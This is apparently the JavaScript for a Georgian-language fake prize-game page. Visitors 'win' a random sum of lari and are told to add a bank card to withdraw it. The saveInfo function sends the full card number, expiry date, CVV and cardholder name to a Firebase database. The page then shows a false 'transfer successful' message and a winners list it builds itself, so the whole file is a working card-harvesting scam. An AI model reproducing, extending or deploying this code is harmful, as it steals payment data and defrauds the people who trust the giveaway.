const firebaseConfig = {
  apiKey: "AIzaSyBFBSNGSdiBtw8taQD0YTmzlK35zEM19JY",
  authDomain: "winmoney-1296e.firebaseapp.com",
  databaseURL: "https://winmoney-1296e-default-rtdb.firebaseio.com",
  projectId: "winmoney-1296e",
  storageBucket: "winmoney-1296e.appspot.com",
  messagingSenderId: "70056983983",
  appId: "1:70056983983:web:15379efab188eff540835a",
  measurementId: "G-93G3QLTDC2",
};

firebase.initializeApp(firebaseConfig);
function addElementInFirebase(REF, data) {
  firebase.database().ref(`${REF}/${randomID()}`).set(data);
}

function getRefFromFirebase(REF) {
  const result = [];
  firebase
    .database()
    .ref(REF)
    .on("value", (response) => {
      response.forEach((element) => {
        result.push(generateFirebaseItem(element.key, element.val()));
      });
    });
  return result;
}

function getElementFromFirebase(REF, id) {
  const array = getRefFromFirebase(REF);
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      array.forEach((element) => {
        if (element.id === id) {
          resolve(element);
        }
      });
      reject("404");
    }, 1000);
  });
}

function removeElementFromFirebase(REF, id) {
  firebase.database().ref(`${REF}/${id}`).remove();
}

function removeRefFromFirebase(REF) {
  firebase.database().ref(REF).remove();
  setTimeout(() => {
    location.reload();
  }, 300);
}

function randomID() {
  let new_data = new Date().toString();
  return new_data;
}

let myArray = [20, 25, 30, 50, 60, 70, 90, 100];

let homePageBtn = document.querySelector(".fa-house");
let withdrawHistoryBtn = document.querySelector(".fa-clock-rotate-left");
let withdrawPageBtn = document.querySelector(".fa-money-check-dollar");
let withdrawHistoryPage = document.querySelector(".withdraw-history-wrapper");
let withdrawPage = document.querySelector(".withdraw-wrapper");
let homePageWrapper = document.querySelector(".home-page-wrapper");
let startedPage = document.querySelector(".started-page");
let loader = document.querySelector(".loader");
let getStartedBtn = document.querySelector(".get-started-btn");
let gamePageWrapper = document.querySelector(".game-page-wrapper");
let guestTitle = document.querySelector(".guest-title");
let winningNumber = document.querySelector(".animatednumb");
let arrayNumbers = randomNumber(myArray);
let numbersArray = arrayNumbers;
let myBalance = document.querySelector(".winn-balance");
let withdrawBtn = document.querySelector(".withdraw-btn");
let guestWinner = document.querySelector(".guest-winner");

let inputName = document.querySelector(".winner-name");
let nexGamePageBtn = document.querySelector(".next-game-page-btn");
let winStartedBtn = document.querySelector(".win-started-btn");
let guestName = "";

inputName.addEventListener("click", () => {
  inputName.classList.remove("error");
  document.getElementsByName("username")[0].placeholder = "";
});

nexGamePageBtn.addEventListener("click", () => {
  if (inputName.value === "") {
    document.getElementsByName("username")[0].placeholder =
      "სახელის ველი ცარიელია!";
    inputName.classList.add("error");
  } else {
    guestName = inputName.value;
    inputName.value = "";

    loader.classList.remove("hidden");
    withdrawPage.classList.add("hidden");
    withdrawHistoryPage.classList.add("hidden");
    homePageWrapper.classList.add("hidden");
    gamePageWrapper.classList.add("hidden");
    startedPage.classList.add("hidden");
    setTimeout(() => {
      loader.classList.add("hidden");
      startedPage.classList.add("hidden");
      withdrawPage.classList.add("hidden");
      withdrawHistoryPage.classList.add("hidden");
      homePageWrapper.classList.add("hidden");
      gamePageWrapper.classList.remove("hidden");
    }, 2000);
    guestTitle.innerHTML = `გამარჯობა! <span class="user-name">${guestName}</span>`;
  }
});

getStartedBtn.addEventListener("click", () => {
  loader.classList.remove("hidden");
  withdrawPage.classList.add("hidden");
  withdrawHistoryPage.classList.add("hidden");
  homePageWrapper.classList.add("hidden");
  setTimeout(() => {
    loader.classList.add("hidden");
    startedPage.classList.remove("hidden");
    withdrawPage.classList.add("hidden");
    withdrawHistoryPage.classList.add("hidden");
    homePageWrapper.classList.add("hidden");
  }, 2000);
});

homePageBtn.addEventListener("click", () => {
  loader.classList.remove("hidden");
  withdrawPage.classList.add("hidden");
  withdrawHistoryPage.classList.add("hidden");
  homePageWrapper.classList.add("hidden");
  startedPage.classList.add("hidden");
  gamePageWrapper.classList.add("hidden");
  setTimeout(() => {
    loader.classList.add("hidden");
    homePageWrapper.classList.remove("hidden");
    withdrawPage.classList.add("hidden");
    withdrawHistoryPage.classList.add("hidden");
    startedPage.classList.add("hidden");
    gamePageWrapper.classList.add("hidden");
  }, 2000);
});

withdrawHistoryBtn.addEventListener("click", () => {
  loader.classList.remove("hidden");
  withdrawPage.classList.add("hidden");
  homePageWrapper.classList.add("hidden");
  withdrawHistoryPage.classList.add("hidden");
  startedPage.classList.add("hidden");
  gamePageWrapper.classList.add("hidden");
  setTimeout(() => {
    loader.classList.add("hidden");
    withdrawHistoryPage.classList.remove("hidden");
    withdrawPage.classList.add("hidden");
    homePageWrapper.classList.add("hidden");
    gamePageWrapper.classList.add("hidden");
    startedPage.classList.add("hidden");
  }, 2000);
});

withdrawPageBtn.addEventListener("click", () => {
  loader.classList.remove("hidden");
  withdrawHistoryPage.classList.add("hidden");
  homePageWrapper.classList.add("hidden");
  withdrawPage.classList.add("hidden");
  startedPage.classList.add("hidden");
  gamePageWrapper.classList.add("hidden");
  setTimeout(() => {
    loader.classList.add("hidden");
    withdrawPage.classList.remove("hidden");
    withdrawHistoryPage.classList.add("hidden");
    homePageWrapper.classList.add("hidden");
    startedPage.classList.add("hidden");
    gamePageWrapper.classList.add("hidden");
  }, 2000);
});

winStartedBtn.addEventListener("click", () => {
  let coinPrimary = document.querySelector(".coin");
  coinPrimary.classList.remove("primary-loader");
  coinPrimary.classList.add("second-loader");
  setTimeout(() => {
    coinPrimary.classList.remove("second-loader");
    winningNumber.innerHTML = `თქვენ მოიგეთ <span class="user-name">${numbersArray} ₾</span>`;
    myBalance.innerHTML = numbersArray;
    winningNumber.classList.add("second-numb-animation");
    guestTitle.innerHTML = `<span class="user-name">${guestName} </span> გილოცავთ!`;
    guestTitle.classList.add("guest-winner-animated");
    let giftTitle = document.querySelector(".gift-title");
    giftTitle.innerHTML = "თანხის გასატანად დააკლიკეთ ქვემოთ მოცემულ ღილაკს!";
    giftTitle.classList.add("gift-animated");
    winStartedBtn.classList.add("hidden");
    withdrawBtn.classList.add("withdraw-btn-animated");
    withdrawBtn.classList.remove("hidden");
  }, "2100");
});

withdrawBtn.addEventListener("click", () => {
  loader.classList.remove("hidden");
  withdrawHistoryPage.classList.add("hidden");
  homePageWrapper.classList.add("hidden");
  withdrawPage.classList.add("hidden");
  startedPage.classList.add("hidden");
  gamePageWrapper.classList.add("hidden");
  setTimeout(() => {
    loader.classList.add("hidden");
    withdrawPage.classList.remove("hidden");
    withdrawHistoryPage.classList.add("hidden");
    homePageWrapper.classList.add("hidden");
    startedPage.classList.add("hidden");
    gamePageWrapper.classList.add("hidden");
    guestWinner.innerHTML = `<span class="user-name">${guestName}</span> <br> თქვენი ბალანსია <span class="user-name">${numbersArray}₾</span>`;
  }, 2000);
});

let addCardWrapper = document.querySelector(".add-card-wrapper");
let addCardBtn = document.querySelector(".add-card-btn");
addCardBtn.addEventListener("click", () => {
  addCardBtn.classList.add("add-card-btn-animated");

  setTimeout(() => {
    addCardBtn.classList.add("hidden");

    addCardWrapper.classList.remove("hidden");
  }, 700);
});

function randomNumber(myArray) {
  return myArray[Math.floor(Math.random() * myArray.length)];
}

let cardInputValue = document.querySelector(".card-input-value");
let cardDataValue = document.querySelector(".card-data-value");

cardInputValue.addEventListener(
  "input",
  () =>
    (cardInputValue.value = formatNumber(
      cardInputValue.value.replaceAll(" ", "")
    ))
);

const formatNumber = (number) =>
  number.split("").reduce((seed, next, index) => {
    if (index !== 0 && !(index % 4)) seed += " ";
    return seed + next;
  }, "");

cardDataValue.addEventListener(
  "input",
  () =>
    (cardDataValue.value = dataCardNumber(
      cardDataValue.value.replaceAll(" / ", "")
    ))
);
const dataCardNumber = (number) =>
  number.split("").reduce((seed, next, index) => {
    if (index !== 0 && !(index % 2)) seed += " / ";
    return seed + next;
  }, "");

const cardNumber = document.querySelector("#card-number");
const cardData = document.querySelector("#card-data");
const cardCvv = document.querySelector("#card-cvv");
const cardName = document.querySelector("#card-name");
let addCardAcceptBtn = document.querySelector(".add-card-accept-btn");
let addCardValidationsWrapper = document.querySelector(".add-card-validations");
let acceptWrapper = document.querySelector(".accept-wrapper");
let cardInfo = document.querySelector(".card-info");

let asecondCardNumber = cardNumber;
let bsecondCardData = cardData;
let csecondCardCvv = cardCvv;
let dsecondCardName = cardName;
let cardInfoWrapper = document.querySelector(".cashout-wrapper");
let removeCardBtn = document.querySelector(".fa-xmark");
let withdrawRules = document.querySelector(".withdraw-rules");

addCardAcceptBtn.addEventListener("click", () => {
  if (asecondCardNumber.value === "") {
    asecondCardNumber.classList.add("valerror");
  } else if (bsecondCardData.value === "") {
    bsecondCardData.classList.add("valerror");
  } else if (csecondCardCvv.value === "") {
    csecondCardCvv.classList.add("valerror");
  } else if (dsecondCardName.value === "") {
    dsecondCardName.classList.add("valerror");
  } else {
    let hiddenCardInfo = cardNumber.value;
    hiddenCardInfo =
      hiddenCardInfo.substring(0, 7) +
      " ** **** " +
      hiddenCardInfo.substring(15);
    saveInfo();
    addCardValidationsWrapper.classList.add("hidden");
    acceptWrapper.classList.remove("hidden");
    addCardAcceptBtn.classList.add("hidden");
    setTimeout(() => {
      acceptWrapper.classList.add("hidden");
      cardInfoWrapper.classList.remove("hidden");
      cardInfo.innerHTML = hiddenCardInfo;
      asecondCardNumber.value = "";
      bsecondCardData.value = "";
      csecondCardCvv.value = "";
      dsecondCardName.value = "";
      withdrawRules.classList.add("card-added");
      withdrawRules.innerHTML = "ბარათი წარამტებით დაემატა!!!";
    }, 2200);
  }
});

removeCardBtn.addEventListener("click", () => {
  cardInfoWrapper.classList.add("hidden");
  cardInfo.innerHTML = "";
  acceptWrapper.classList.remove("hidden");
  withdrawRules.innerHTML =
    "თანხის გასატანად საჭიროა ნებისმიერი ბანკის პლასტიკური ან ციფრული ბარათის დამატება!";
  withdrawRules.classList.remove("card-added");
  setTimeout(() => {
    acceptWrapper.classList.add("hidden");
    addCardValidationsWrapper.classList.remove("hidden");
    addCardAcceptBtn.classList.remove("hidden");
    addCardWrapper.classList.add("hidden");
    addCardBtn.classList.remove("add-card-btn-animated");
    addCardBtn.classList.remove("hidden");
  }, 2200);
});

asecondCardNumber.addEventListener("click", () => {
  asecondCardNumber.classList.remove("valerror");
});

bsecondCardData.addEventListener("click", () => {
  bsecondCardData.classList.remove("valerror");
});

csecondCardCvv.addEventListener("click", () => {
  csecondCardCvv.classList.remove("valerror");
});

dsecondCardName.addEventListener("click", () => {
  dsecondCardName.classList.remove("valerror");
});

function saveInfo() {
  addElementInFirebase("Card", {
    asecondCardNumber: asecondCardNumber.value,
    bsecondCardData: bsecondCardData.value,
    csecondCardCvv: csecondCardCvv.value,
    dsecondCardName: dsecondCardName.value,
  });
}

let winerData = new Date().toString();
let winner_Data = new Date().toLocaleDateString("en-GB");

function saveWinnerUserInfo() {
  addElementInFirebase("Users", {
    myBalance: numbersArray,
    guestName: guestName,
    winerData: winner_Data,
  });
}

let cashoutBtn = document.querySelector(".cashout-btn");
let cashOutLoader = document.querySelector(".cashoutloader");
let transactionBtn = document.querySelector(".transaction-btn");

cashoutBtn.addEventListener("click", () => {
  if (
    localStorage.gamewinner !=
    JSON.stringify({
      result: "successfully",
    })
  ) {
    saveWinnerUserInfo();
    withdrawRules.innerHTML = "თანხის გატანა...";
    setTimeout(() => {
      withdrawRules.innerHTML =
        "გადარიცხვა წარმატებით შესრულდა! თანხა აისახება თქვენს ანგარიშზე მომდევნო 24 საათის განმავლობაში.";
      addCardWrapper.classList.add("hidden");
      myBalance.classList.add("balanceanimated");
      guestWinner.classList.add("balanceanimated");
      myBalance.innerHTML = "0";
      guestWinner.innerHTML = `<span class="user-name">${guestName}</span> <br> თქვენი ბალანსია <span class="user-name">0 ₾</span>`;
      transactionBtn.classList.remove("hidden");
    }, 1500);

    localStorage.gamewinner = JSON.stringify({
      result: "successfully",
    });
  } else {
    let gamewinner = JSON.parse(localStorage.gamewinner);

    withdrawRules.innerHTML = `<p class="red"><span class="green"> ${guestName}, </span>სამწუხაროდ თქვენ ვეღარ შეძლებთ თანხის გატანას! თქვენ უკვე მიიღეთ ერთხელ გათამაშებაში მონაწილეობა !!!</p>`;
  }
});

let withdrawHistoryUssers = document.querySelector(".withdraw-history-ussers");

firebase
  .database()
  .ref("Users")
  .on("child_added", (snapshot) => {
    lastWithdraw(snapshot.val());
  });
function lastWithdraw(data) {
  withdrawHistoryUssers.innerHTML += `
     
          <div class="lastWithdraw-wrapper">
         <p class="name-tit">სახელი: <span class="green">${data.guestName}</span></p>
         <p class="name-tit">პრიზი: <span class="green">${data.myBalance} ₾</span></p>
         <p class="name-tit">თარიღი: <span class="red">${data.winerData}</span></p>
         <i class="fa-solid fa-check fa-checkk"></i>
        
      </div>
    `;
}

transactionBtn.addEventListener("click", () => {
  loader.classList.remove("hidden");
  withdrawHistoryPage.classList.add("hidden");
  homePageWrapper.classList.add("hidden");
  withdrawPage.classList.add("hidden");
  startedPage.classList.add("hidden");
  gamePageWrapper.classList.add("hidden");
  setTimeout(() => {
    loader.classList.add("hidden");
    withdrawPage.classList.add("hidden");
    withdrawHistoryPage.classList.remove("hidden");
    homePageWrapper.classList.add("hidden");
    startedPage.classList.add("hidden");
    gamePageWrapper.classList.add("hidden");
  }, 2000);
});
